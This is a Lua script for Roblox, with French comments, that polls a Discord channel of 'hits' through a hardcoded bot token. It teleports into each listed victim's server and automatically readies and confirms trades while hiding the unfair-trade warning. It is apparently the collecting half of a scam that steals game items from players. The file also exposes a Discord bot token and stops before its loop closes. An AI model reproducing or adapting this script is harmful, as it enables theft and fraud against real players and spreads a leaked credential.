-- Variables globales

token = "MTQyMzU1NDY3NTA3MjA0MTAzMg.GqYvrq.pvDoX2tUmsnm7hbKjybKFpTfX4ObOrPOIxud9A" -- Remplacez par votre token Discord

channelId = "1433494369822052402" -- Remplacez par l'ID du canal Discord où les hits sont postés

delay = 1 -- Délai en secondes avant de chatter après le chargement

-- Services

local HttpService = game:GetService("HttpService")

local TeleportService = game:GetService('TeleportService')

-- Fonction pour récupérer les messages du canal Discord

local function fetchMessages()

local response = HttpService:JSONDecode(HttpService:GetAsync("https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=10", Enum.HttpMethod.Get, {["Authorization"] = "Bot " .. token}))

return response

end

-- Fonction pour téléporter et accepter le trade

local function teleportAndTrade(placeId, jobId)

-- Téléporte-toi dans le serveur de la victime

TeleportService:TeleportToPlaceInstance(placeId, jobId)



-- Attends que le jeu soit chargé

game:GetService("RunService").RenderStepped:Wait()



-- Accepte automatiquement le trade

local function acceptTrade()

    local tradeGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("Trade")

    tradeGui.Main.Visible = true

    tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function()

        tradeGui.Main.Visible = true

    end)

    tradeGui.UnfairTradeWarning.Visible = false

    tradeGui.UnfairTradeWarning:GetPropertyChangedSignal("Visible"):Connect(function()

        tradeGui.UnfairTradeWarning.Visible = false

    end)

    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()

        if tradeGui.Enabled then

            -- Accepte le trade

            local args = {

                [1] = true

            }

            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))

            -- Confirme le trade

            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()

        end

    end)

end



-- Lance la fonction d'acceptation de trade

acceptTrade()

end

-- Boucle principale pour écouter les notifications du webhook

while true do

local messages = fetchMessages()

for _, message in ipairs(messages) do

    if message.content and message.content:find("TeleportToPlaceInstance") then

        local placeId, jobId = string.match(message.content, "TeleportToPlaceInstance%((%d+),%s*['\"](%S+)['\"]%)")

        if placeId and jobId then

            teleportAndTrade(placeId, jobId)

            wait(delay)

        end

    end

end

wait(5) -- Attends 5 secondes avant de vérifier à nouveau
